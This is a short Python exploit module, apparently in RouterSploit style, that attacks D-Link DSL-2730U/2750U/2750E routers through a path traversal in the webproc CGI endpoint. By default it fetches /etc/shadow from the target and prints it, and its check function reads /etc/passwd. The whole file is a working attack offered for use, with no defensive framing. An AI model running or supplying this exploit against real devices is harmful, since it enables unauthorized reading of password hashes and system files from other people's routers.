# rsf exploit module
# description: Module exploits D-Link DSL-2730U/2750U/2750E Path Traversal
import requests

def exploit(target, port, filename="/etc/shadow"):
    try:
        path = f"/cgi-bin/webproc?getpage={filename}&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard"
        
        response = requests.get(
            f"http://{target}:{port}{path}",
            timeout=5
        )
        
        if response.status_code == 200 and response.text:
            print(response.text)
            return True
        return False
    except:
        return False

def check(target, port=80):
    return exploit(target, port, "/etc/passwd")
